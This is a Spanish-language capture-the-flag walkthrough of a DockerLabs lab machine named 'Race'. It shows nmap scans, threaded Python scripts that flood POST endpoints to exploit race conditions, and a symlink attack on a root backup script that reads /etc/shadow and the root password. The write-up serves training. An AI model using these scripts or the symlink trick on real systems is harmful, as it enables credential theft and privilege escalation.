![Screenshot](/medium/Race/Images/machine.png)

Dificultad: **medio**

Creado por: **el pinguino de mario**

# Pasos para pwnear 🥽

* 👁️  [Reconocimiento](#reconocimiento)
* 🪓 [Explotación](#explotación)
* 🚩 [Escalada de privilegios](#escalada-de-privilegios)

---

Primero aseguramos que la máquina esté encendida, podemos hacer esto rápidamente con el comando **ping**.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/race]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.235 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.127 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.128 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2039ms
rtt min/avg/max/mdev = 0.127/0.163/0.235/0.050 ms
```

**Nota**: con esta máquina vamos a practicar una vulnerabilidad que es una **race conditions**, básicamente vamos a usar algunos **hilos** y explotar esto tan rápido que incluso romperemos algunas verificaciones del sistema.

Ahora, podemos comenzar nuestra **fase de reconocimiento**.

---
# Reconocimiento

Primero, usamos una herramienta que es **nmap**, para ver qué puertos están abiertos en el objetivo.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/race/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-01 20:19 -05
Initiating ARP Ping Scan at 20:19
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 20:19, 0.12s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 20:19
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 5000/tcp on 172.17.0.2
Completed SYN Stealth Scan at 20:19, 2.73s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000024s latency).
Scanned at 2025-12-01 20:19:38 -05 for 3s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
5000/tcp open  upnp    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.11 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- Con este argumento le decimos a nmap que escanee todos los puertos, desde el puerto 1, hasta el puerto 65,535.

**-n** <- Con este argumento nmap saltará la resolución DNS, esto es porque a veces en nuestros escaneos esto puede ser muy lento en algunos casos.

**-sS** <- Con este argumento nmap hará un escaneo en modo oculto, esto significa que no se completará el 3-way-handshake y también hará el escaneo ligeramente más rápido.

**--min-rate 5000** <- Con este argumento nmap enviará al menos 5000 paquetes por segundo, haciendo el escaneo aún más rápido.

**-Pn** <- Con este argumento nmap también saltará la fase de descubrimiento de host, esto significa que nmap tratará la máquina como activa y hará inmediatamente el escaneo.

**-vv** <- Con este argumento nmap nos mostrará los puertos abiertos descubiertos mientras continúa el escaneo, esto significa que si nmap descubre un puerto abierto inmediatamente nos lo reportará mientras el escaneo continúa.

**--open** <- Con este argumento le decimos a nmap que solo filtre los puertos abiertos.

Cuando el escaneo concluye podemos ver 2 puertos abiertos en el objetivo:

- puerto 22 (ssh / secure shell)
- puerto 5000 ***(upnp?)***

Podemos hacer otro escaneo de nmap para ver más sobre estos puertos.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/race/enumeration]
└─$ nmap -p22,5000 -sCV 172.17.0.2 -oX target --stats-every=1m
```

**-p22,5000** <- Con este argumento nmap solo escaneará estos 2 puertos que descubrimos.

**-sCV** <- Con este argumento nmap escaneará por cada puerto su versión para encontrar posibles vulnerabilidades en sistemas no actualizados, y también hará un escaneo con algunos scripts que ejecutan nmap, para encontrar más sobre estos puertos.

**-oX target** <- Con este argumento guardamos toda la salida que nmap nos da y la guardamos como un archivo xml.

**--stats-every=1m** <- Con este argumento recibimos estadísticas del escaneo cada 1 minuto, esto puede tener minutos (m) y segundos (s)

Después de que el escaneo termine obtenemos la salida en un archivo xml, lo hacemos para generar una página html para ver la información de manera más fácil y bonita.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/race/enumeration]
└─$ xsltproc target -o target.html
```

Con este comando convertimos el archivo xml a un archivo html, ahora abriremos el archivo.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/race/enumeration]
└─$ open target.html 
```

Y podemos ver esto en nuestro navegador.

![Screenshot](/medium/Race/Images/image1.png)

Es mucho más bonito y más legible. Podemos ver que el puerto 5000 es un sitio web, veamos con nuestro navegador.

![Screenshot](/medium/Race/Images/image2.png)

Podemos ver esto, podemos hacer clic en este botón **"execute action"** interceptemos la solicitud con **burpsuite**.

```python
POST /click HTTP/1.1
Host: 172.17.0.2:5000
Content-Length: 0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: */*
Sec-GPC: 1
Accept-Language: en-GB,en;q=0.5
Origin: http://172.17.0.2:5000
Referer: http://172.17.0.2:5000/
Accept-Encoding: gzip, deflate, br
Cookie: iconSize=16x16
Connection: keep-alive
```

Podemos ver que hace una **solicitud POST** cuando hacemos clic en este botón, y esta es la respuesta en el sitio web:

![Screenshot](/medium/Race/Images/image3.png)

Okay, voy a hacer un **script de python** para hacer una **solicitud POST** una y otra vez para romper el límite de este sitio web.

---
# Explotación

```python
import requests
import threading

url = "http://172.17.0.2:5000/click"

def execute():
        while True:
                response = requests.post(url=url).text

                if "completada" in response:
                        print("[+] Click yayy!!!")
                else: print("[-] Sad T_T...")

array = [threading.Thread(target=execute).start() for i in range(1000)]
```

Okay así que vamos a hacer una solicitud POST una y otra vez con hilos esto puede ir muy rápido! y esperemos que incluso evite el límite.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/race/exploits]
└─$ python3 exploit.py 
[+] Click yayy!!!
[+] Click yayy!!!
[+] Click yayy!!!
[+] Click yayy!!!
[-] Sad T_T...
[-] Sad T_T...
[-] Sad T_T...
```

Y podemos ver esto en el sitio web:

![Screenshot](/medium/Race/Images/image4.png)

Obtuvimos las credenciales para pasar al nivel 2!

Y podemos ver el siguiente nivel:

![Screenshot](/medium/Race/Images/image5.png)

La técnica es la misma pero veamos cómo podemos canjear este **cupon** e interceptar la solicitud con **burpsuite**.

```python
POST /level-2/redeem HTTP/1.1
Host: 172.17.0.2:5000
Content-Length: 19
Authorization: Basic [REDACTED]
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Sec-GPC: 1
Accept-Language: en-GB,en;q=0.5
Origin: http://172.17.0.2:5000
Referer: http://172.17.0.2:5000/level-2
Accept-Encoding: gzip, deflate, br
Cookie: iconSize=16x16
Connection: keep-alive

{
    "code":"TRIAL-10"
}
```

Podemos usar el script que hicimos antes y cambiarlo un poco.

```python
import requests
import threading
import json

url = "http://172.17.0.2:5000/level-2/redeem"

heads = {
        "Authorization": "Basic [REDACTED]",
        "Content-Type": "application/json"
}

payload = {
        "code": "TRIAL-10"
}

def execute():
        while True:
                response = requests.post(url=url, headers=heads, data=json.dumps(payload)).text

                if "canjeado" in response:
                        print("[+] Reclaimed Yayyy!!!")
                else: print("[-] Sad T_T...")

array = [threading.Thread(target=execute).start() for i in range(1000)]
```

Así que ahora necesitamos cambiar los encabezados para enviar la **Authorization** que obtuvimos antes y también cambiar el **Content-Type** a **application/json** para enviar el código en formato json, y el payload como **data** pero sin olvidar estar en formato json (json.dumps)

Ahora, ejecutemos el exploit.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/race/exploits]
└─$ python3 exploit.py 
[+] Reclaimed Yayyy!!!
[-] Sad T_T...
[-] Sad T_T...
[-] Sad T_T...
[-] Sad T_T...
[+] Reclaimed Yayyy!!!
[-] Sad T_T...
```

Y podemos ver esto en el sitio web:

![Screenshot](/medium/Race/Images/image6.png)

Okay así que ahora tenemos suficiente dinero para comprar la suscripción!

![Screenshot](/medium/Race/Images/image7.png)

Así que obtenemos las credenciales para pasar al nivel 3!

![Screenshot](/medium/Race/Images/image8.png)

Okay así que parece que tenemos suficiente dinero para comprar un bitcoin, pero la técnica es la misma así que interceptemos la solicitud una vez más con **burpsuite**.

```python
POST /level-3/buy HTTP/1.1
Host: 172.17.0.2:5000
Content-Length: 12
Authorization: Basic [REDACTED]
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Sec-GPC: 1
Accept-Language: en-GB,en;q=0.5
Origin: http://172.17.0.2:5000
Referer: http://172.17.0.2:5000/level-3
Accept-Encoding: gzip, deflate, br
Cookie: iconSize=16x16
Connection: keep-alive

{
    "amount":1
}
```

Okay así que ahora modifiquemos nuestra explotación nuevamente.

```python
import requests
import threading
import json

url = "http://172.17.0.2:5000/level-3/buy"

heads = {
        "Authorization": "Basic [REDACTED]",
        "Content-Type": "application/json"
}

payload = {
        "amount": 1
}

def execute():
        while True:
                response = requests.post(url=url, headers=heads, data=json.dumps(payload)).text

                if "exitosa" in response:
                        print("[+] Yummy Bitcoin!!!")
                else: print("[-] Sad T_T...")

array = [threading.Thread(target=execute).start() for i in range(1000)]
```

Okay así que ahora ejecutemos nuestra explotación.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/race/exploits]
└─$ python3 exploit.py 
[-] Sad T_T...
[-] Sad T_T...
[+] Yummy Bitcoin!!!
[+] Yummy Bitcoin!!!
[-] Sad T_T...
[-] Sad T_T...
[-] Sad T_T...
[-] Sad T_T...
[-] Sad T_T...
[+] Yummy Bitcoin!!!
```

Y podemos ver esto en el sitio web:

![Screenshot](/medium/Race/Images/image9.png)

Así que obtenemos las credenciales para iniciar sesión con ssh!

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/race/exploits]
└─$ ssh racebtc@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:Fn2UBTt82Thn4IZ/6vgyYHLh90t6h4W0Tbz51FIXhC8
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
racebtc@172.17.0.2's password: 
Linux 49b878989770 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
racebtc@49b878989770:~$
```

Okay así que ahora podemos comenzar nuestra **fase de escalada de privilegios**.

---
# Escalada de privilegios

Cuando entramos a la máquina con ssh, inmediatamente obtenemos una explotación para escalar nuestros privilegios, pero no voy a usarlo, voy a escalar de mi propia manera.

Podemos ver algunos procesos interesantes en la máquina.

```
racebtc@49b878989770:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   4076  2192 ?        Ss   01:13   0:00 /bin/bash /docker-entrypoint.sh
root           7  0.0  0.0   4076  2444 ?        S    01:14   0:01 /bin/bash /usr/local/bin/backup_script.sh
root          22  0.0  0.1  11776  3692 ?        Ss   01:14   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 start
root          23  0.0  0.1  44916  6572 ?        S    01:14   0:00 python3 app.py
root          24  1.5 11.8 14806992 405420 ?     Sl   01:14   1:49 /usr/bin/python3 app.py
root        8639  0.0  0.3  19884 10440 ?        Ss   02:31   0:00 sshd-session: racebtc [priv]
racebtc     8650  0.0  0.2  19848  6924 ?        S    02:32   0:00 sshd-session: racebtc@pts/0
racebtc     8651  0.0  0.1   4340  3704 pts/0    Ss   02:32   0:00 -bash
root        9110  0.0  0.0   2596  1556 ?        S    03:09   0:00 sleep 5
racebtc     9111 25.0  0.1   6404  3688 pts/0    R+   03:09   0:00 ps aux
```

Vemos un script **backup_script.sh** veamos que hay en él.

```bash
#!/bin/bash
# Vulnerable backup script - runs continuously in background as root
# Educational purpose: demonstrates TOCTOU (Time-Of-Check-Time-Of-Use) race condition

BACKUP_DIR="/var/backups/user_files"
USER_DIR="/home/racebtc/backup_me"
LOG_FILE="/tmp/backup_output.txt"

# Ensure directories exist
mkdir -p "$BACKUP_DIR"
mkdir -p "$USER_DIR"

# Make log world-readable
touch "$LOG_FILE"
chmod 666 "$LOG_FILE"

echo "╔════════════════════════════════════════════════════╗" > "$LOG_FILE"
echo "║   Backup Script - Ejecutando como ROOT           ║" >> "$LOG_FILE"
echo "╚════════════════════════════════════════════════════╝" >> "$LOG_FILE"
echo "" >> "$LOG_FILE"

# Run forever checking for files to backup
while true; do
    # Process files marked for backup by users
    for file in "$USER_DIR"/*; do
        if [ -e "$file" ]; then
            echo "[$(date '+%H:%M:%S')] Archivo encontrado: $file" >> "$LOG_FILE"
            
            # VULNERABLE: Race window of 3 seconds!
            echo "[$(date '+%H:%M:%S')] Esperando 3 segundos antes de procesar..." >> "$LOG_FILE"
            sleep 3
            
            # VULNERABLE: Read the file content without re-checking
            echo "[$(date '+%H:%M:%S')] Leyendo contenido del archivo..." >> "$LOG_FILE"
            if [ -f "$file" ]; then
                cat "$file" >> "$LOG_FILE" 2>&1
                echo "" >> "$LOG_FILE"
            fi
            
            # Clean up
            rm -f "$file" 2>/dev/null
            echo "[$(date '+%H:%M:%S')] Archivo procesado y eliminado" >> "$LOG_FILE"
            echo "---" >> "$LOG_FILE"
        fi
    done
    
    # Check every 5 seconds
    sleep 5
done
```

Podemos ver aquí que el programa cada 5 segundos (**sleep 5**) busca archivos en el directorio **backup_me**.

si encuentra cualquier archivo en este directorio, el programa va a esperar 3 segundos (**sleep 3**)

Cuando el archivo existe, el programa va a tomar el contenido del archivo y lo va a guardar en los registros (```cat "$file" >> "$LOG_FILE"```) El archivo de registro existe en el directorio **/tmp/backup_output.txt**

Así que en **resumen**, cuando existe un archivo en el directorio **backup_me** se va a guardar el contenido del archivo en el archivo de registro (**backup_output.txt**) Pero esto es **crítico**!

Porque podemos leer cualquier archivo en el sistema! Y cómo?

Existe una función en linux que podemos vincular archivos en el sistema a otro archivo, esto se llama un **enlace simbólico** por ejemplo existe un archivo que es **passwd** pero este archivo está vinculado al archivo en **/etc/passwd** así que estamos realmente viendo el archivo **/etc/passwd**.

Vamos a probar si esto funciona.

Primero entramos al directorio que el script está revisando.

```
racebtc@49b878989770:~$ cd backup_me/
```

Okay así que estamos creando un archivo con un **enlace simbólico** al archivo **/etc/shadow**. (recuerda que el archivo **shadow** solo se puede ver como el usuario **root**)

Y el script está ejecutándose como el usuario **root** si recuerdas.

```
racebtc@49b878989770:~/backup_me$ ln -s /etc/shadow funny
racebtc@49b878989770:~/backup_me$ ls
funny
```

Okay así que esperemos al menos 5 segundos si esto funciona...

```
racebtc@49b878989770:~/backup_me$ cat /tmp/backup_output.txt 
╔════════════════════════════════════════════════════╗
║   Backup Script - Ejecutando como ROOT           ║
╚════════════════════════════════════════════════════╝

[03:31:18] Archivo encontrado: /home/racebtc/backup_me/funny
[03:31:18] Esperando 3 segundos antes de procesar...
[03:31:21] Leyendo contenido del archivo...
root:$y$j9T$Js9taseqecU82uc9Fr2En/$Fs/oRo5/3o9gB/h1LscVzCm0ozfAY8AgAFhUAziq3sB:20423:0:99999:7:::
daemon:*:20409:0:99999:7:::
bin:*:20409:0:99999:7:::
sys:*:20409:0:99999:7:::
sync:*:20409:0:99999:7:::
games:*:20409:0:99999:7:::
man:*:20409:0:99999:7:::
lp:*:20409:0:99999:7:::
mail:*:20409:0:99999:7:::
news:*:20409:0:99999:7:::
uucp:*:20409:0:99999:7:::
proxy:*:20409:0:99999:7:::
www-data:*:20409:0:99999:7:::
backup:*:20409:0:99999:7:::
list:*:20409:0:99999:7:::
irc:*:20409:0:99999:7:::
_apt:*:20409:0:99999:7:::
nobody:*:20409:0:99999:7:::
systemd-network:!*:20423:::::1:
systemd-timesync:!*:20423:::::1:
messagebus:!*:20423::::::
sshd:!*:20423::::::
racebtc:$y$j9T$PjcpwgTk.Eb9wdsSweh/g.$0/gMG4V/z0a6/LjGoR08f6j1tu.iuW2a1gEUnUg80qC:20423:0:99999:7:::

[03:31:21] Archivo procesado y eliminado
---
```

Y tuvimos éxito! veamos si podemos ver también ver la bandera del usuario **root**

```
racebtc@49b878989770:~/backup_me$ ln -s /root/flag.txt yayy
```

Okay así que esperemos de nuevo...

Okay veamos si podemos ver el contenido de la bandera.

```
racebtc@49b878989770:~/backup_me$ cat /tmp/backup_output.txt 
╔════════════════════════════════════════════════════╗
║   Backup Script - Ejecutando como ROOT           ║
╚════════════════════════════════════════════════════╝

.................

[03:31:21] Archivo procesado y eliminado
---
[03:37:56] Archivo encontrado: /home/racebtc/backup_me/yayy
[03:37:56] Esperando 3 segundos antes de procesar...
[03:37:59] Leyendo contenido del archivo...
FLAG{root_password:[REDACTED]}

[03:37:59] Archivo procesado y eliminado
---
```

Obtuvimos la contraseña del usuario root! veamos si funciona...

```
racebtc@49b878989770:~/backup_me$ su
Password: 
root@49b878989770:/home/racebtc/backup_me# whoami
root
```

Ahora somos root ***...pwned..!***
